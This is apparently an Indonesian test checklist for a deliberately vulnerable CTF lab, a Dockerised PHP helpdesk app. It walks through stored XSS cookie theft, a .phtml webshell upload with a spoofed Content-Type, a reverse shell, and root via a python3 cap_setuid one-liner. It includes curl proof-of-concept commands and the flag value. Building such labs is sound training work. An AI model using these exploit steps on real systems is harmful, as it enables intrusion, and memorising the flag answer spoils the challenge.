# Rencana & Status Pengujian

## Checklist Verifikasi Lokal

- [ ] `docker compose up --build` - `web` dan `db` start bersih tanpa error.
- [ ] Form `/index.php` bisa submit tiket normal (tanpa lampiran), redirect ke
      `/confirmation.php?id=<id>` dengan nomor tiket yang benar.
- [ ] Login staff (`demo.staff` / `DemoStaff123!`) berhasil, dashboard menampilkan
      daftar tiket termasuk seed data awal.
- [ ] **XSS**: submit tiket dengan payload `<script>` di `deskripsi`, buka sebagai staff
      di `staff/ticket.php?id=`, konfirmasi payload jalan (mis. cookie theft ke listener
      lokal). Field `subjek` dengan payload sama harus tampil ter-escape (tidak jalan) -
      verifikasi kontras ini secara eksplisit.
- [ ] **File Upload negatif**: upload `webshell.php` langsung harus ditolak dengan
      pesan error yang sesuai.
- [ ] **File Upload positif**: upload `webshell.phtml` (Content-Type `image/jpeg`
      dispoof) berhasil tersimpan; akses `uploads/tickets/<id>_webshell.phtml?cmd=id`
      mengembalikan output `id` dengan `uid=33(www-data)`. Ulangi dengan `.phar` untuk
      konfirmasi varian kedua juga jalan.
- [ ] **File Upload negatif (kalibrasi legacy extension)**: upload `webshell.php3`
      (atau `.php4`/`.php5`/`.pht`) harus **lolos validasi** (bukan ditolak filter),
      tapi saat diakses cuma tampil sebagai source code mentah, bukan tereksekusi -
      konfirmasi bahwa hanya `.phtml`/`.phar` yang benar-benar RCE di stack PHP 8.2 ini.
- [ ] Dari webshell, trigger reverse/bind shell interaktif, konfirmasi shell benar-benar
      interaktif (diperlukan untuk langkah privesc).
- [ ] **Privesc**: dari shell `www-data`, `getcap -r / 2>/dev/null` menampilkan
      `python3.X cap_setuid=ep`; jalankan exploit GTFOBins persis
      (`python3 -c 'import os; os.setuid(0); os.execl("/bin/sh", "sh")'`, boleh lewat
      symlink `python3` biasa, tidak perlu `python3.X`), konfirmasi shell baru
      `uid=0(root)`.
- [ ] **Flag**: dari shell `www-data` (sebelum privesc), `cat /root/flag.txt` harus
      gagal (`Permission denied`). Setelah privesc ke root, `cat /root/flag.txt`
      menampilkan `TEKNOBANTU{c4p_s3tu1d_1s_n0t_sud0}`.
- [ ] Konfirmasi `docker-compose.yml` **tidak** memiliki `no-new-privileges`/`cap_drop`
      pada service `web` (akan mematikan privesc kalau ada).
- [ ] `db` tidak expose port ke host (`docker compose ps` tidak menampilkan port mapping
      untuk service `db`).
- [ ] Reload halaman staff berkali-kali tidak memicu error PHP (cek
      `docker compose logs web` untuk warning/error yang tidak disengaja).

## Cara Iterasi Cepat

```bash
docker compose up --build
# aplikasi tersedia di http://localhost:8083

# lihat log Apache/PHP
docker compose logs -f web

# masuk ke container web untuk debugging manual
docker compose exec web bash

# reset database (hapus volume) kalau seed perlu diulang dari nol
docker compose down -v
```

## Contoh Perintah PoC (curl)

```bash
# Upload webshell.phtml dengan Content-Type dispoof
curl -F "nama=Test Attacker" \
     -F "email=attacker@example.com" \
     -F "subjek=Laporan upload" \
     -F "deskripsi=Uji upload lampiran" \
     -F "lampiran=@webshell.phtml;type=image/jpeg" \
     http://localhost:8083/submit.php

# Setelah dapat ticket_id dari redirect, eksekusi:
curl "http://localhost:8083/uploads/tickets/<id>_webshell.phtml?cmd=id"
```
